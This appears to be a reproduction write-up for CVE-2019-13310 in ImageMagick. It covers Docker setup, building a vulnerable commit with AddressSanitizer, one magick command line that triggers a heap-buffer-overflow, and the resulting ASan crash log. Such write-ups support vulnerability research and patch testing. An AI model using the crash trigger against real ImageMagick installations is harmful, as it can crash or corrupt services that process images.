### CVE-2019-13310

### PoC Links
[Github.com](https://github.com/ImageMagick/ImageMagick/issues/1616)

### Docker Container Run Command
```shell
docker build -t cve-2019-13310-poc .
docker run --privileged --cap-add sys_ptrace  --security-opt seccomp=unconfined -itd --name CVE-2019-13310-POC cve-2019-13310-poc
docker exec -it CVE-2019-13310-POC /bin/bash
```

### PoC Reproduce Command
```shell
# Preparing the initial environment
apt-get update -y
apt-get install git -y

# Configure local SSH for Github and clone the repository. (ssh-keygen)
cd /poc
git clone git@github.com:ImageMagick/ImageMagick.git

# Rollback to the vulnerable version.
cd ImageMagick//
git reset --hard e6654d84be7a15e7c7653cdfbedf6b1ef42a569c

# Install the compilation and installation dependencies.
apt install gcc gdb make pkg-config libtool-bin build-essential llvm-dev libunwind-dev -y

# Configure, compile, and install.
CFLAGS="-O0 -g -fsanitize=address" ./configure --disable-openmp
make -j$(nproc)
make install
ldconfig

# exec the poc
magick -seed 0 -quality 3 "(" magick:logo +repage ")" "(" magick:wizard +repage ")" -quiet -caption "%h%U" -compare -insert 2   tmp

```
### Description
Observed that:
```shell
=================================================================
==28789==ERROR: AddressSanitizer: heap-buffer-overflow on address 0xffff86efea80 at pc 0xffff8d066160 bp 0xffffd5f72950 sp 0xffffd5f72960
WRITE of size 4 at 0xffff86efea80 thread T0
#0 0xffff8d06615c in SetPixelViaPixelInfo MagickCore/pixel-accessor.h:804
#1 0xffff8d0786e8 in EnhanceImage MagickCore/enhance.c:1976
#2 0xffff8ccec450 in CLISimpleOperatorImage MagickWand/operation.c:2284
#3 0xffff8ccf86e0 in CLISimpleOperatorImages MagickWand/operation.c:3685
#4 0xffff8cd01f64 in CLIOption MagickWand/operation.c:5273
#5 0xffff8cbab6c8 in ProcessCommandOptions MagickWand/magick-cli.c:477
#6 0xffff8cbacf64 in MagickImageCommand MagickWand/magick-cli.c:796
#7 0xffff8cbea49c in MagickCommandGenesis MagickWand/mogrify.c:185
#8 0xaaaae59ea24c in MagickMain utilities/magick.c:149
#9 0xaaaae59ea4d8 in main utilities/magick.c:180
#10 0xffff8c5873f8 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
#11 0xffff8c5874c8 in __libc_start_main_impl ../csu/libc-start.c:392
#12 0xaaaae59e9c2c in _start (/usr/local/bin/magick+0x1c2c)

0xffff86efea80 is located 0 bytes to the right of 905856-byte region [0xffff86e21800,0xffff86efea80)
allocated by thread T0 here:
#0 0xffff8d85af34 in __interceptor_posix_memalign ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:226
#1 0xffff8d125894 in AcquireAlignedMemory MagickCore/memory.c:265
#2 0xffff8cf8f608 in OpenPixelCache MagickCore/cache.c:3728
#3 0xffff8cf87b98 in GetImagePixelCache MagickCore/cache.c:1754
#4 0xffff8cf978ac in SyncImagePixelCache MagickCore/cache.c:5488
#5 0xffff8d0f2924 in SetImageStorageClass MagickCore/image.c:2627
#6 0xffff8d06ebdc in EnhanceImage MagickCore/enhance.c:1891
#7 0xffff8ccec450 in CLISimpleOperatorImage MagickWand/operation.c:2284
#8 0xffff8ccf86e0 in CLISimpleOperatorImages MagickWand/operation.c:3685
#9 0xffff8cd01f64 in CLIOption MagickWand/operation.c:5273
#10 0xffff8cbab6c8 in ProcessCommandOptions MagickWand/magick-cli.c:477
#11 0xffff8cbacf64 in MagickImageCommand MagickWand/magick-cli.c:796
#12 0xffff8cbea49c in MagickCommandGenesis MagickWand/mogrify.c:185
#13 0xaaaae59ea24c in MagickMain utilities/magick.c:149
#14 0xaaaae59ea4d8 in main utilities/magick.c:180
#15 0xffff8c5873f8 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
#16 0xffff8c5874c8 in __libc_start_main_impl ../csu/libc-start.c:392
#17 0xaaaae59e9c2c in _start (/usr/local/bin/magick+0x1c2c)

SUMMARY: AddressSanitizer: heap-buffer-overflow MagickCore/pixel-accessor.h:804 in SetPixelViaPixelInfo
Shadow bytes around the buggy address:
0x200ff0ddfd00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0x200ff0ddfd10: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0x200ff0ddfd20: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0x200ff0ddfd30: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0x200ff0ddfd40: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x200ff0ddfd50:[fa]fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x200ff0ddfd60: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x200ff0ddfd70: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x200ff0ddfd80: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x200ff0ddfd90: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x200ff0ddfda0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
Addressable:           00
Partially addressable: 01 02 03 04 05 06 07
Heap left redzone:       fa
Freed heap region:       fd
Stack left redzone:      f1
Stack mid redzone:       f2
Stack right redzone:     f3
Stack after return:      f5
Stack use after scope:   f8
Global redzone:          f9
Global init order:       f6
Poisoned by user:        f7
Container overflow:      fc
Array cookie:            ac
Intra object redzone:    bb
ASan internal:           fe
Left alloca redzone:     ca
Right alloca redzone:    cb
Shadow gap:              cc
==28789==ABORTING
```



